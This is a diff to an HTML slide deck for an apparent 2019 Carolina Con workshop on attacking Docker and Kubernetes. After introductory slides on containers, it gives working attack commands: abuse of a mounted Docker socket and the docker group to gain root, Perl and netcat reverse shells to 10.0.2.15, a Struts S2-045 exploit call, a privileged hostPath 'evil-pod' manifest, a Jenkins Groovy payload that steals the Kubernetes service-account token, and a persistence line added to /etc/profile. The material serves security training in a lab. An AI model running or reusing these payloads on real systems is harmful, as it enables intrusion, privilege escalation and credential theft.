@@ -25,7 +25,7 @@
 	<body>
 		<div class="reveal">
 			<div class="slides">
-				<section>
+				<section data-background="./shippingyardgif.gif">
 					<section data-markdown>
 						## Professionally 
 						# Evil 
@@ -84,6 +84,10 @@
 					</section>
 					<section data-markdown>
 						#### First off, a container is not (always) a Virtual Machine.
+						
+						The definition given on the Kubernetes web site is actually really good:
+
+						> A lightweight and portable executable image that contains software and all of its dependencies.
 					</section>
 					<section data-markdown>
 						<script type="text/template">
@@ -108,7 +112,7 @@
 				</section>
 				<section>
 					<section data-markdown>
-						#### What is Docker 
+						## What is Docker 
 					</section>
 					<section data-markdown>
 						<script type="text/template">
@@ -136,10 +140,237 @@
 				</section>
 				<section>
 					<section data-markdown>
-						#### Okay, but what is Kubernetes
+						## Okay, but what is Kubernetes
 					</section>
 					<section data-markdown>
-						#### Kubernetes (k8s) is
+						#### From kubernetes.io
+
+						> Kubernetes (k8s) is an open-source system for automating deployment,
+						> scaling, and management of containerized applications.
+					</section>
+					<section data-markdown>
+						#### A clear as mud!
+					</section>
+					<section data-markdown>
+						<script type="text/template">
+							#### Some k8s terms
+							- cluster: set of machines, called nodes the run containers managed by k8s <!-- .element: class="fragment" data-fragment-index="1" -->
+							- pod: the base k8s object, represents a set of running containers on a cluster <!-- .element: class="fragment" data-fragment-index="2" -->
+							- deployment: an API object which manages a replicated application <!-- .element: class="fragment" data-fragment-index="3" -->
+							- service: an API object which describes how to access applications <!-- .element: class="fragment" data-fragment-index="4" -->
+						</script>
+					</section>
+					<section data-markdown>
+						<script type="text/template">
+							#### k8s terms cont.
+							- node: worker maching in a k8s cluster, can be a VM or a physical machines <!-- .element: class="fragment" data-fragment-index="5" -->
+								- or in our case a docker container :) <!-- .element: class="fragment" data-fragment-index="6" -->
+							- namespaces: virtual clusters backed by the same physical cluster <!-- .element: class="fragment" data-fragment-index="7" -->
+							- kube-apiserver: component on the master that exposes the k8s API <!-- .element: class="fragment" data-fragment-index="8" -->
+
+						</script>
+					</section>
+					<section data-markdown>
+						When in doubt RTFM [k8s concepts](https://kubernetes.io/docs/concepts/)
+
+						Also see [k8s glossary](https://kubernetes.io/docs/reference/glossary/?fundamental=true)
+					</section>
+				</section>
+				<section>
+					<section data-markdown data-background="./lolhtml.jpg">
+						## Time for the good stuff now!
+					</section>
+					<section data-markdown data-background="./lolhtml.jpg">
+						## Hacking Stuff!
+						(obligatory stock "hacking" image)
+					</section>
+				</section>
+				<section>
+					<section data-markdown>
+						### Attacking the Docker socket
+
+						![](./wowzers.png)
+					</section>
+					<section data-markdown>
+						#### Scenario:
+
+						We've popped some web app or something and we're sitting here with a command shell on the server.
+						Let's do some poking around, maybe this container happens to have the docker socket mounted to it!
+					</section>
+					<section data-markdown>
+						#### Recon
+						```bash
+						cat /proc/1/cgroup | grep -E -i ":/docker/"
+						find "/" -name docker.sock 2>&1
+						```
+					</section>
+					<section data-markdown>
+						#### Exploitation
+						```bash
+						curl -s -XGET --unix-socket $DOCKER_SOCK_PATH http://localhost/containers/json
+						curl --unix-socket /run/docker.sock http://localhost/images/json
+						read -r -d '' RSHELL << EOF
+						use Socket;\$i=\"10.0.2.15\";\$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};
+						EOF
+						read -r -d '' CONTAINER_JSON << EOF
+						{"Image":"ubuntu","Cmd":["/bin/sh","-c","perl -e '$RSHELL'"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}
+						EOF
+						curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$CONTAINER_ID/start
+						```
+					</section>
+					<section data-markdown>
+						#### Explanation
+						- Identified that we were in a Docker container
+						- Located the Docker socket which happened to be mounted to the container
+						- Used the docker socker to recon what containers and images are on the host system
+						- Used the docker socket to create our own malicious container with the host file system bind mounted and a reverse shell connection
+					</section>
+				</section>
+				<section>
+					<section data-markdown>
+						#### Exploiting the Docker group
+					</section>
+					<section data-markdown>
+						#### Scenario:
+
+						We've yet again popped a box and we're sitting here with a command shell on the server.
+						Only this time we're a user with pretty basic privs... However, this user is in the **docker group**.
+					</section>
+					<section data-markdown>
+						#### Recon
+						```bash
+						id
+						cat /etc/shadow
+						groups | grep "docker"
+						docker ps -a 
+						docker images -a
+						```
+					</section>
+					<section data-markdown>
+						#### Exploitation
+						```bash	
+						docker run -it --privileged --net=host --ipc=host -v /:/host busybox chroot /host
+						```
+						[The most pointless docker command ever](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/)
+					</section>
+					<section data-markdown>
+						#### Explanation
+						- Figured out what user we were
+						- Found that we don't have very many permissions
+						- Found that we belong to the docker group
+						- Leverage our ability to run docker to elevate our privileges to root
+					</section>
+				</section>
+				<section>
+					<section data-markdown>
+						# It's time for the main event
+					</section>
+					<section data-markdown>
+						I didn't even bother with writing this section up.
+						The next few slides are just a bunch of commands that we're going to use.
+						I'm very sleepy...
+					</section>
+					<section data-markdown>
+						### Let's get started
+
+						Open a browser in your lab vm and navigate to creditdataco.wtf:30080
+					</section>
+					<section data-markdown>
+						```bash
+						read -r -d '' RSHELL << EOF
+						use Socket;\$i="10.0.2.15";\$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+						EOF
+						python .kube_cluster/S2-045.py creditdataco.wtf:30080 "perl -e \'$RSHELL\'"
+						```
+					</section>
+					<section data-markdown>
+						```bash
+						read -r -d '' POD <<-'EOF'
+						apiVersion: v1
+						kind: Pod
+						metadata:
+						    name: evil-pod
+						spec:
+						    containers:
+						    - name: evil-container 
+						      image: ubuntu:latest
+						      command: ["sleep", "infinity"]
+						      securityContext:
+						        privileged: true
+						      volumeMounts:
+						      - mountPath: /mnt/host
+						        name: evil-volume
+						        mountPropagation: Bidirectional
+						    volumes:
+						    - name: evil-volume
+						      hostPath:
+						        path: /
+						EOF
+						```
+					</section>
+					<section data-markdown>
+						```bash
+						cat << EOF > ./groovy.payload
+						def command = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+						def proc = command.execute()
+						proc.waitFor()
+						println "\${proc.in.text}"
+						EOF
+						```
+					</section>
+					<section data-markdown>
+						```bash
+						JENKINS_TOKEN=`curl -d "script=$(<./groovy.payload)" -X POST http://10.104.236.89:8080/scriptText`
+						# look for images already being used on the cluster.
+						curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" $KUBE/api/v1/namespaces/default/pods 2>&1| grep -i \"image\":
+						curl -k -XPOST -H "Content-Type: application/yaml" -H "Authorization: Bearer ${JENKINS_TOKEN}" -d "$POD" https://10.96.0.1:443/api/v1/namespaces/default/pods
+						curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod
+						curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" \
+						    -H "Connection: Upgrade" \
+						    -H "Upgrade: websocket" \
+						    -H "Host: blah.com:80" \
+						    -H "Origin: http://blah.com:80" \
+						    -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
+						    -H "Sec-WebSocket-Version: 13" \
+						    'https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod/exec?command=/bin/bash&command=-c&command=apt%20update%26%26apt%20install%20-y%20netcat%3bnetcat%20-e%20/bin/sh%2010.0.2.15%204444&stdin=true&stdout=true&stderr=true'
+						```
+					</section>
+					<section data-markdown>
+						```bash
+						cat << EOF > /mnt/host/rshell
+						use Socket;\$i="10.0.2.15";\$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+						EOF
+						echo "/usr/bin/perl -U /rshell &" >> /etc/profile
+						```
+					</section>
+				</section>
+				<section data-markdown>
+					# That's it folks!
+				</section>
+				<section data-markdown>
+					## I'd like to thank
+					- My employer [Secure Ideas, LLC](www.secureideas.com)
+						- I'm biased, but if you want good pentests then check us out :)
+					- Everybody that I get to work with every day, because they all rock
+					- Alex and Ochaun for helping out and hanging out
+					- Everybody who attended the workshop
+				</section>
+				<section data-markdown>
+					# And last but not least...
+				</section>
+				<section data-markdown>
+					## The organizers of this years (2019) [Carolina Con](https://carolinacon.info/)
+				</section>
+				<section>
+					<section data-markdown>
+						# Contact Info
+					</section>
+					<section data-markdown>
+						- Email: cory@secureideas.com
+						- Twitter: [@84d93r](www.twitter.com/84d93r)
+						- Carrier Pigeon: It just knows where to go, okay
+						- Lat,Lon of my secret base: [24.9999993,-71.0087548](https://www.google.com/maps/place/Bermuda+Triangle/@24.9999993,-71.0087548,15z/data=!4m13!1m7!3m6!1s0x89451ab5034cb7ab:0xb600ecf3df7aca4d!2sBermuda+Triangle!3b1!8m2!3d25!4d-71!3m4!1s0x89451ab5034cb7ab:0xb600ecf3df7aca4d!8m2!3d25!4d-71)
+							- No solicitation, please
 					</section>
 				</section>
 			</div>
@@ -173,7 +404,7 @@
 		<div id="hidden" style="display:none;">
 			<div id="header">
 				<div id="footer-left">
-					<img src="https://www.secureideas.com/images/SI_Logo.png" />
+					<img src="./SI_Logo.png" />
 				</div>
 			</div>
 		</div>
